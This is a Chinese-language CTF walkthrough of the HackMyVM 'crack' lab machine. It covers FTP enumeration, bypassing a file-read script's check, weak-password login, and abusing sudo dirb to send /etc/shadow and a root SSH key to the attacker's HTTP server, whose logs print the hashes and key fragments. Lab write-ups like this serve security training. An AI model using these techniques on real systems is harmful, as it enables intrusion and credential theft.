# hmv_crack

# 0.简介

**靶机**：[hackmyvm - crack](https://hackmyvm.eu/machines/machine.php?vm=crack)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 15:51 CST
Nmap scan report for 192.168.205.143
Host is up (0.00043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
4200/tcp  open  vrml-multi-use
12359/tcp open  unknown
MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds

```

`4000、12359`是什么端口我们不知道，所以我们先看**ftp**端口

# 2.踩点

```bash
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.143                         
Connected to 192.168.205.143.
220 (vsFTPd 3.0.3)
Name (192.168.205.143:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50526|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp> cd upload
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||30618|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp> mget crack.py
mget crack.py [anpqy?]? y
229 Entering Extended Passive Mode (|||35830|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |*****************************************************************************************|   849        1.71 MiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (799.51 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ cat crack.py  
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = "NO"
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = "/srv/ftp/upload/"+filename
                if os.path.isfile(check) and os.path.isfile(file):
                        f = open(file,"r")
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass

```

发现了`12359`端口的运行脚本，脚本实现文件读取服务。我们上去看看

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc 192.168.205.143 12359                       
File to read:/etc/passwd
NOFile to read:crack.py
['import os\n', 'import socket\n', 's = socket.socket()\n', 's.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n', 'port = 12359\n', "s.bind(('', port))\n", 's.listen(50)\n', '\n', 'c, addr = s.accept()\n', 'no = "NO"\n', 'while True:\n', '        try:\n', "                c.send('File to read:'.encode())\n", '                data = c.recv(1024)\n', "                file = (str(data, 'utf-8').strip())\n", '                filename = os.path.basename(file)\n', '                check = "/srv/ftp/upload/"+filename\n', '                if os.path.isfile(check) and os.path.isfile(file):\n', '                        f = open(file,"r")\n', '                        lines = f.readlines()\n', '                        lines = str(lines)\n', '                        lines = lines.encode()\n', '                        c.send(lines)\n', '                else:\n', '                        c.send(no.encode())\n', '        except ConnectionResetError:\n', '                pass\n']
```

经过尝试可以发现只可以查看存在的文件，但是根据源码我们可以看出，他只是判断了`/srv/ftp/upload/` 中是否存在这个文件，如果存在就会查询，我们可以上传一个我们感兴趣的重名文件去试图读取

```bash
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.143
Connected to 192.168.205.143.
220 (vsFTPd 3.0.3)
Name (192.168.205.143:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||19129|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp> cd upload
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||41641|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp> put passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||16042|)
150 Ok to send data.
100% |*****************************************************************************************|     4        0.20 KiB/s    00:00 ETA
226 Transfer complete.
4 bytes sent in 00:00 (0.19 KiB/s)
ftp> put id_rsa 
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||42637|)
150 Ok to send data.
100% |*****************************************************************************************|  2656      135.55 KiB/s    00:00 ETA
226 Transfer complete.
2656 bytes sent in 00:00 (129.95 KiB/s)

```

利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc 192.168.205.143 12359
File to read:/etc/passwd
['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']
┌──(kali㉿kali)-[~/test]
└─$ echo 'root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n' |grep bash
root:x:0:0:root:/root:/bin/bash
, cris:x:1000:1000:cris,,,:/home/cris:/bin/bash

```

存在`cris`用户，我们尝试读取私钥

```bash
File to read:/home/cris/.ssh/id_rsa
NO
```

没有或者没有权限，那我们去看看其他端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.143:4200/
curl: (52) Empty reply from server

```

空连接，我去......

等会`12359`端口是文件读取，`21`是辅助，那远程连接端口在哪？

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p4200 -Pn -sV 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 16:08 CST
Nmap scan report for 192.168.205.143
Host is up (0.00034s latency).

PORT     STATE SERVICE  VERSION
4200/tcp open  ssl/http ShellInABox
MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.53 seconds

```

原来是需要**https**连接

![Image](https://github.com/user-attachments/assets/35c088b0-7083-4f33-b462-c86838925382)

尝试一下弱密码(cris：cris)

![Image](https://github.com/user-attachments/assets/5d244afd-f3a0-47cf-ac95-b516cc8734f3)

猜对咯

# 3.提权

```bash
cris@crack:~$ sudo -l                                                                                                                                                                        
Matching Defaults entries for cris on crack:                                                                                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                                   
                                                                                                                                                                                             
User cris may run the following commands on crack:                                                                                                                                           
    (ALL) NOPASSWD: /usr/bin/dirb                                                                                                                                                            
cris@crack:~$ ls                                                                                                                                                                             
crack.py  user.txt  ziempre.py
cris@crack:~$ cat ziempre.py                                                                                                                                                                 
#!/usr/local/lib/python3.7                                                                                                                                                                     
from subprocess import Popen                                                                                                                                                                 
import sys                                                                                                                                                                                   
program = "/home/cris/crack.py"                                                                                                                                                              
while True:                                                                                                                                                                                  
    p = Popen("python3 "+program, shell=True)                                                                                                                                                
    p.wait()                                                                                                                                                                                 
                                                                                                                                       
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /etc/shadow                                                                                                                          
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:12:22 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /etc/shadow                                                                                                                                                                  
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 28
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:12:22 2025                                                                                                                                                           
DOWNLOADED: 28 - FOUND: 0                                                                                                                                                                    
```

接收一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /randomfile1 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /frand2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /root:$y$j9T$LVT9GIrLdk5L.xns1akJZ1$wmigJ7er07AT/VwIAuYSZ3j94LOCe8EJHC6d2mlZVo3:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /daemon:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /bin:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /sys:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /sync:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /games:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /man:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /lp:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /mail:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /news:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /uucp:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /proxy:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /www-data:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /backup:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /list:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /irc:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /gnats:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /nobody:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /_apt:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /systemd-network:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /systemd-resolve:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /messagebus:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /systemd-timesync:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /sshd:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /cris:$y$j9T$kFXVxpRhH2ZAeDGNazqRq/$IokBR4XhhyRJOur8YOHu3fF59/0NOHC5AIsvkxXx8..:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /systemd-coredump:!*:19515:::::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /shellinabox:*:19515:0:99999:7::: HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] "GET /ftp:*:19515:0:99999:7::: HTTP/1.1" 404 -

```

我去这么狠，自定义加密算法。测试读取`.bash_history`

```bash
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /root/.bash_history                                                                                                                  
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:16:41 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /root/.bash_history                                                                                                                                                          
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 0
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:16:41 2025                                                                                                                                                           
DOWNLOADED: 0 - FOUND: 0                                                                                                                                                                     
```

再试试`id_rsa`

```bash
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /root/.ssh/id_rsa                                                                                                                    
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:19:00 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /root/.ssh/id_rsa                                                                                                                                                            
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 38
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:19:00 2025                                                                                                                                                           
DOWNLOADED: 38 - FOUND: 0                                                                                                                                                                    
```

接收

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /randomfile1 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /frand2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /-----BEGIN HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] "GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1" 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
